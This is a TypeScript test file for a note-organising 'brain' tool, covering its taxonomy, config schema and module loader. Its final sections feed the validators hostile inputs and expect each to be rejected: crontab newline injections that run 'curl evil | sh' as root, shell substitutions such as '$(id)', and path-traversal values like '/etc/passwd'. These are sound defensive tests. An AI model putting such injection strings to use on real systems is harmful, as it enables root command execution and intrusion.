import { describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { brainConfigSchema, type BrainConfig } from "../src/lib/config";
import { loadModules } from "../src/lib/module-loader";
import type { LoadedModule } from "../src/lib/module-types";
import { buildTaxonomy } from "../src/lib/taxonomy";

/** A speaking-like module used across tests. */
function speakingModule(): LoadedModule {
  return {
    key: "@schlessera/brain-module-speaking",
    dir: "/tmp/fake",
    config: {},
    manifest: {
      name: "speaking",
      taxonomy: {
        types: {
          talk: { dir: "talks" },
          conference: { dir: "conferences" },
          travel: { dir: "travel" },
        },
        classifierHints: {
          conference: ["cfp", "call for papers", "keynote", "conference", "submission deadline", "speaker slot"],
          travel: ["itinerary", "flight", "hotel booking", "accommodation", "road trip", "check-in", "train to"],
        },
        assetTitleRules: [
          { pattern: "talks/*/slides/**", label: "Slide", slugFrom: 1 },
          { prefix: "talks/", label: "Talk Asset" },
        ],
      },
      indexRules: { dirAnchors: ["status.md", "itinerary.md", "outline.md"] },
      exclude: { segments: ["alt-decks", "versions", "deck"] },
    },
  };
}

/** A user config in the shape the reference brain uses. */
function referenceUserConfig(): BrainConfig {
  return brainConfigSchema.parse({
    taxonomy: {
      types: {
        career: { dir: "career" },
        expertise: { dir: "expertise" },
        project: {
          dir: "projects/active",
          match: ["projects/"],
          staleDays: 90,
          staleSeverity: "warning",
          appendMatch: true,
        },
        network: { dir: "network", appendMatch: true },
        opinion: { dir: "opinions" },
        strategy: { dir: "content-strategy", orphanExempt: true },
        infrastructure: { dir: "infrastructure", match: ["infrastructure/", "home/"] },
      },
      classifierHints: {
        opinion: ["i think", "i believe", "my position", "my stance", "should", "must"],
      },
      propagation: [{ source: "me/bios/FACTS.md", derivatives: "me/bios/*.md" }],
      assetTitleRules: [
        { prefix: "me/media-kit/photography", label: "Photography" },
        { prefix: "me/media-kit", label: "Media Kit" },
        { prefix: "career/", label: "CV" },
      ],
    },
  });
}

describe("core defaults (no config)", () => {
  const tax = buildTaxonomy({});

  test("core types exist", () => {
    expect(tax.validTypes().sort()).toEqual(["context", "identity", "index", "note"]);
  });

  test("typeForPath falls back to inbox type", () => {
    expect(tax.typeForPath("random/thing.png")).toBe("note");
    expect(tax.typeForPath("me/photo.png")).toBe("identity");
  });

  test("index type skips dir checks", () => {
    expect(tax.expectedPrefixesFor("index")).toBeNull();
    expect(tax.dirForType("index")).toBeNull();
  });

  test("staleness: context 30/warning, default 180/info", () => {
    expect(tax.stalenessFor("context/current-focus.md")).toEqual({ days: 30, severity: "warning" });
    expect(tax.stalenessFor("me/identity.md")).toEqual({ days: 180, severity: "info" });
  });

  test("default canonical + dir anchors", () => {
    expect(tax.canonicalPath("identity")).toBe("me/identity.md");
    expect(tax.canonicalPath("currentFocus")).toBe("context/current-focus.md");
    expect(tax.dirAnchors).toEqual(["_index.md"]);
  });

  test("default exclusions", () => {
    expect(tax.isExcludedPath("CLAUDE.md")).toBe(true);
    expect(tax.isExcludedPath("node_modules/x/y.md")).toBe(true);
    expect(tax.isExcludedPath("me/notes.md")).toBe(false);
  });
});

describe("reference brain shape (modules + user config)", () => {
  const tax = buildTaxonomy({ user: referenceUserConfig(), modules: [speakingModule()] });

  test("reproduces historical inferAssetType", () => {
    expect(tax.typeForPath("me/media-kit/photo.jpg")).toBe("identity");
    expect(tax.typeForPath("talks/the-stack/slides/01.png")).toBe("talk");
    expect(tax.typeForPath("career/cv.pdf")).toBe("career");
    expect(tax.typeForPath("projects/active/x/status.md")).toBe("project");
    expect(tax.typeForPath("conferences/fooconf/notes.md")).toBe("conference");
    expect(tax.typeForPath("home/router.md")).toBe("infrastructure");
    expect(tax.typeForPath("infrastructure/vps.md")).toBe("infrastructure");
    expect(tax.typeForPath("downloads/random.pdf")).toBe("note");
  });

  test("longest prefix wins for nested type dirs", () => {
    const withJobs = buildTaxonomy({
      user: referenceUserConfig(),
      modules: [
        speakingModule(),
        {
          key: "@schlessera/brain-module-jobs",
          dir: "/tmp/fake2",
          config: {},
          manifest: {
            name: "jobs",
            taxonomy: { types: { opportunity: { dir: "career/opportunities" } } },
          },
        },
      ],
    });
    expect(withJobs.typeForPath("career/opportunities/scheria/status.md")).toBe("opportunity");
    expect(withJobs.typeForPath("career/cv.md")).toBe("career");
  });

  test("reproduces historical staleness rules", () => {
    expect(tax.stalenessFor("projects/active/x.md")).toEqual({ days: 90, severity: "warning" });
    expect(tax.stalenessFor("projects/archive/y.md")).toEqual({ days: 180, severity: "info" });
    expect(tax.stalenessFor("context/now.md")).toEqual({ days: 30, severity: "warning" });
  });

  test("type-mismatch prefixes honour match lists", () => {
    expect(tax.expectedPrefixesFor("project")).toEqual(["projects/"]);
    expect(tax.expectedPrefixesFor("infrastructure")).toEqual(["infrastructure/", "home/"]);
  });

  test("reproduces historical deriveAssetTitle", () => {
    expect(tax.assetTitleFor("me/media-kit/photography/head.jpg")).toBe("Photography: head");
    expect(tax.assetTitleFor("me/media-kit/one-pager.pdf")).toBe("Media Kit: one-pager");
    expect(tax.assetTitleFor("talks/shipbuilding-basics/slides/05.png")).toBe(
      "Slide: 05 (shipbuilding-basics)"
    );
    expect(tax.assetTitleFor("talks/shipbuilding-basics/poster.pdf")).toBe("Talk Asset: poster");
    // Prefix rules match the containing dir: nested files match "career/",
    // a direct child of career/ falls through to the generic dir label
    // (verbatim historical deriveAssetTitle semantics).
    expect(tax.assetTitleFor("career/applications/scheria/jd.pdf")).toBe("CV: jd");
    expect(tax.assetTitleFor("career/cv-2026.pdf")).toBe("career: cv-2026");
    expect(tax.assetTitleFor("notes/scans/receipt.pdf")).toBe("scans: receipt");
  });

  test("classifier order: modules → user → core", () => {
    expect(tax.classify("The CFP closes Friday")).toBe("conference");
    expect(tax.classify("booked the flight and hotel booking")).toBe("travel");
    expect(tax.classify("I think this pattern is wrong")).toBe("opinion");
    expect(tax.classify("what matters right now")).toBe("context");
    expect(tax.classify("plain shopping list")).toBeNull();
  });

  test("user hints layer onto a module's hints for the same type", () => {
    // A module owning `conference` used to silence the user's own conference
    // vocabulary entirely; personal venue names never reached the classifier.
    const withPersonalVenues = buildTaxonomy({
      modules: [speakingModule()],
      user: brainConfigSchema.parse({
        taxonomy: {
          types: { opinion: { dir: "opinions" } },
          classifierHints: {
            conference: ["wordcamp", "cloudfest"],
            opinion: ["my stance"],
          },
        },
      }),
    });

    expect(withPersonalVenues.classify("submitting to WordCamp Europe")).toBe("conference");
    expect(withPersonalVenues.classify("CloudFest is in March")).toBe("conference");
    // The module's own vocabulary still works.
    expect(withPersonalVenues.classify("The CFP closes Friday")).toBe("conference");
    // And a type only the user declares is unaffected.
    expect(withPersonalVenues.classify("my stance on this")).toBe("opinion");
  });

  test("hint order follows first appearance, not the last contributor", () => {
    // `conference` is claimed by the module, so it keeps the module's slot
    // ahead of a user-only type declared later.
    const tax2 = buildTaxonomy({
      modules: [speakingModule()],
      user: brainConfigSchema.parse({
        taxonomy: {
          types: { opinion: { dir: "opinions" } },
          // "keynote" is deliberately shared with the module's conference list.
          classifierHints: { opinion: ["keynote"] },
        },
      }),
    });
    expect(tax2.classify("a keynote slot")).toBe("conference");
  });

  test("module dir anchors + exclude segments merge", () => {
    expect(tax.dirAnchors).toEqual(["_index.md", "status.md", "itinerary.md", "outline.md"]);
    expect(tax.isExcludedPath("talks/foo/alt-decks/v1.md")).toBe(true);
    expect(tax.isExcludedPath("talks/foo/deck/build.png")).toBe(true);
  });

  test("append-match + orphan-exempt flags", () => {
    expect(tax.appendMatchTypes()).toEqual(["project", "network"]);
    expect(tax.isOrphanExempt("index")).toBe(true);
    expect(tax.isOrphanExempt("context")).toBe(true);
    expect(tax.isOrphanExempt("strategy")).toBe(true);
    expect(tax.isOrphanExempt("career")).toBe(false);
  });

  test("propagation rules pass through", () => {
    expect(tax.propagation).toEqual([
      { source: "me/bios/FACTS.md", derivatives: "me/bios/*.md" },
    ]);
  });
});

describe("collisions and overrides", () => {
  test("module redefining a core type throws", () => {
    expect(() =>
      buildTaxonomy({
        modules: [
          {
            key: "x",
            dir: "/tmp",
            config: {},
            manifest: { name: "x", taxonomy: { types: { identity: { dir: "people" } } } },
          },
        ],
      })
    ).toThrow(/collision/);
  });

  test("two types claiming the identical prefix throws", () => {
    expect(() =>
      buildTaxonomy({
        user: brainConfigSchema.parse({
          taxonomy: {
            types: {
              alpha: { dir: "shared" },
              beta: { dir: "shared" },
            },
          },
        }),
      })
    ).toThrow(/prefix/);
  });

  test("user may override a core type", () => {
    const tax = buildTaxonomy({
      user: brainConfigSchema.parse({
        taxonomy: { types: { note: { dir: "inbox", inbox: true } } },
      }),
    });
    expect(tax.dirForType("note")).toBe("inbox");
    expect(tax.typeForPath("inbox/x.md")).toBe("note");
  });

  test("removing every inbox type throws", () => {
    expect(() =>
      buildTaxonomy({
        user: brainConfigSchema.parse({
          taxonomy: { types: { note: { dir: "notes", inbox: false } } },
        }),
      })
    ).toThrow(/inbox/);
  });

  test("canonical entry can be disabled with empty string", () => {
    const tax = buildTaxonomy({
      user: brainConfigSchema.parse({ taxonomy: { canonical: { currentFocus: "" } } }),
    });
    expect(tax.canonicalPath("currentFocus")).toBeNull();
    expect(tax.canonicalPath("identity")).toBe("me/identity.md");
  });

  test.each(["constructor", "toString", "hasOwnProperty", "valueOf", "__proto__"])(
    "an unset inherited canonical key %s returns null without throwing",
    (key) => {
      const tax = buildTaxonomy({ user: brainConfigSchema.parse({}) });
      expect(() => tax.canonicalPath(key)).not.toThrow();
      expect(tax.canonicalPath(key)).toBeNull();
    }
  );

  test("configured prototype-named canonical keys keep normalized paths", () => {
    const config = brainConfigSchema.parse({
      taxonomy: {
        canonical: {
          constructor: "./notes//raft.md",
          hasOwnProperty: "notes/./voyage.md",
          identity: "",
          voyage: "./journeys//home.md",
        },
      },
    });
    expect(Object.entries(config.taxonomy!.canonical!)).toEqual([
      ["constructor", "./notes//raft.md"],
      ["hasOwnProperty", "notes/./voyage.md"],
      ["identity", ""],
      ["voyage", "./journeys//home.md"],
    ]);
    const tax = buildTaxonomy({ user: config });
    expect(tax.canonicalPath("constructor")).toBe("notes/raft.md");
    expect(tax.canonicalPath("hasOwnProperty")).toBe("notes/voyage.md");
    expect(tax.canonicalPath("identity")).toBeNull();
    expect(tax.canonicalPath("voyage")).toBe("journeys/home.md");
    expect(tax.canonicalPath("currentFocus")).toBe("context/current-focus.md");
    expect(tax.canonicalPath("unset")).toBeNull();
  });

  test("a canonical path comes back in the index's spelling", () => {
    const tax = buildTaxonomy({
      user: brainConfigSchema.parse({
        taxonomy: { canonical: { currentFocus: "./context//current-focus.md", identity: "me/./identity.md" } },
      }),
    });
    expect(tax.canonicalPath("currentFocus")).toBe("context/current-focus.md");
    expect(tax.canonicalPath("identity")).toBe("me/identity.md");
  });

  test("classifierHints for unknown type throws", () => {
    expect(() =>
      buildTaxonomy({
        user: brainConfigSchema.parse({
          taxonomy: { classifierHints: { ghost: ["boo"] } },
        }),
      })
    ).toThrow(/unknown type/);
  });

  test("config schema rejects typos (strict)", () => {
    expect(() => brainConfigSchema.parse({ taxonomyy: {} })).toThrow();
    expect(() =>
      brainConfigSchema.parse({ taxonomy: { types: { note: { dirr: "x" } } } })
    ).toThrow();
  });
});

describe("repo-relative path containment in config", () => {
  test("accepts relative dirs, '.', and trailing-slash matches", () => {
    expect(() =>
      brainConfigSchema.parse({
        taxonomy: {
          types: {
            index: { dir: ".", match: [] },
            project: { dir: "projects/active", match: ["projects/"] },
          },
        },
      })
    ).not.toThrow();
  });

  test("rejects absolute, ~, backslash, and .. dir values", () => {
    for (const dir of ["/etc", "~/brain", "a\\b", "../outside", "a/../../b"]) {
      expect(() =>
        brainConfigSchema.parse({ taxonomy: { types: { note: { dir } } } })
      ).toThrow();
    }
  });

  test("rejects escaping canonical and dirAnchors entries", () => {
    expect(() =>
      brainConfigSchema.parse({ taxonomy: { canonical: { identity: "/etc/passwd" } } })
    ).toThrow();
    expect(() =>
      brainConfigSchema.parse({ taxonomy: { dirAnchors: ["../_index.md"] } })
    ).toThrow();
  });
});

describe("modules key containment", () => {
  test("accepts package names and ./repo-relative paths", () => {
    expect(() =>
      brainConfigSchema.parse({
        modules: { "@schlessera/brain-module-jobs": {}, "some-module": {}, "./local/mod": {} },
      })
    ).not.toThrow();
  });

  test("rejects ../, absolute, and traversing module keys", () => {
    for (const key of ["../outside-mod", "/abs/mod", "./local/../../escape", "~/mod"]) {
      expect(() => brainConfigSchema.parse({ modules: { [key]: {} } })).toThrow();
    }
  });

  test("rejects control characters in keys and paths", () => {
    // A newline here reaches a generated ROOT crontab line via the module
    // key in the logger tag, where it would start its own command.
    const nl = String.fromCharCode(10);
    const cr = String.fromCharCode(13);
    for (const key of [`./a${nl}b`, `./a${cr}b`]) {
      expect(() => brainConfigSchema.parse({ modules: { [key]: {} } })).toThrow();
    }
    expect(() =>
      brainConfigSchema.parse({ taxonomy: { types: { note: { dir: `notes${nl}x` } } } })
    ).toThrow();
  });
});

describe("module cron field constraints", () => {
  // The loader's contribution schema is not exported; exercise it through a
  // local module fixture the loader actually imports. The fixture returns
  // whatever cron entries its config block hands it, so one module file
  // serves every case.
  async function loadCron(cron: unknown[]) {
    const root = mkdtempSync(join(tmpdir(), "brain-taxonomy-cron-"));
    try {
      mkdirSync(join(root, "modules", "watchtower"), { recursive: true });
      writeFileSync(
        join(root, "modules", "watchtower", "module.ts"),
        'export default { name: "watchtower", setup: (config) => ({ cron: config.cron }) };\n'
      );
      const loaded = await loadModules(brainConfigSchema.parse({ modules: { "./modules/watchtower": { cron } } }), root);
      return loaded[0]!.manifest.cron;
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  }
  const entry = { name: "scrape", schedule: "0 6 * * *", command: "jobs scrape --all" };

  test("regex shapes accept real entries and reject injection", async () => {
    expect(await loadCron([entry])).toEqual([entry]);

    // Newline injection into a root crontab line, and shell metacharacters.
    const refused: [Partial<typeof entry>, string][] = [
      [{ schedule: "0 6 * * *\n0 0 * * * root curl evil|sh" }, "cron schedule must be a 5-field expression"],
      [{ command: "jobs scrape\n0 0 * * * root sh -c evil" }, "cron command must be a plain"],
      [{ command: "jobs scrape; curl evil | sh" }, "cron command must be a plain"],
      [{ command: "jobs scrape $(id)" }, "cron command must be a plain"],
      [{ command: "jobs scrape `id`" }, "cron command must be a plain"],
      [{ name: "scrape\nroot" }, "cron name must be kebab-case"],
    ];
    for (const [field, message] of refused) {
      const failure = await loadCron([{ ...entry, ...field }]).then(() => null, (error: Error) => error.message);
      expect(failure).toContain(message);
    }
  });
});

describe("exclude.dirs spelling", () => {
  // A directory list invites `drafts/` and `./drafts`. Matched literally, both
  // excluded nothing from the index, and the stats corpus walk pruned the
  // first of them anyway (#139). Normalised on load, every spelling means the same directory — so
  // a brain whose config carries one of them loses those files from its index
  // on the next `brain index`, which is the ruled behaviour.
  for (const entry of ["skipme", "skipme/", "./skipme", "./skipme/", "skipme//", "././skipme"]) {
    test(`${JSON.stringify(entry)} excludes the directory and everything under it`, () => {
      const taxonomy = buildTaxonomy({ user: brainConfigSchema.parse({ exclude: { dirs: [entry] } }) });

      expect(taxonomy.exclude.dirs).toContain("skipme");
      expect(taxonomy.exclude.dirs).not.toContain(entry === "skipme" ? "skipme/" : entry);
      expect(taxonomy.isExcludedPath("skipme/a.md")).toBe(true);
      expect(taxonomy.isExcludedPath("skipme/sub/b.md")).toBe(true);
      expect(taxonomy.isExcludedPath("skipme")).toBe(true);
      // A sibling that only shares the prefix is not the same directory.
      expect(taxonomy.isExcludedPath("skipmenot/a.md")).toBe(false);
    });
  }

  test("nested entries keep their inner separators", () => {
    const taxonomy = buildTaxonomy({ user: brainConfigSchema.parse({ exclude: { dirs: ["./a/b/"] } }) });
    expect(taxonomy.exclude.dirs).toContain("a/b");
    expect(taxonomy.isExcludedPath("a/b/c.md")).toBe(true);
    expect(taxonomy.isExcludedPath("a/c.md")).toBe(false);
  });

  test("an entry that normalises to nothing is dropped, not widened to the whole brain", () => {
    const taxonomy = buildTaxonomy({ user: brainConfigSchema.parse({ exclude: { dirs: ["./", "/", ""] } }) });
    expect(taxonomy.exclude.dirs).not.toContain("");
    expect(taxonomy.isExcludedPath("notes/a.md")).toBe(false);
    expect(taxonomy.isExcludedPath("a.md")).toBe(false);
  });

  test("two spellings of one directory are one entry", () => {
    const taxonomy = buildTaxonomy({
      user: brainConfigSchema.parse({ exclude: { dirs: ["skipme", "skipme/", "./skipme"] } }),
    });
    expect(taxonomy.exclude.dirs.filter((d) => d === "skipme")).toHaveLength(1);
  });
});
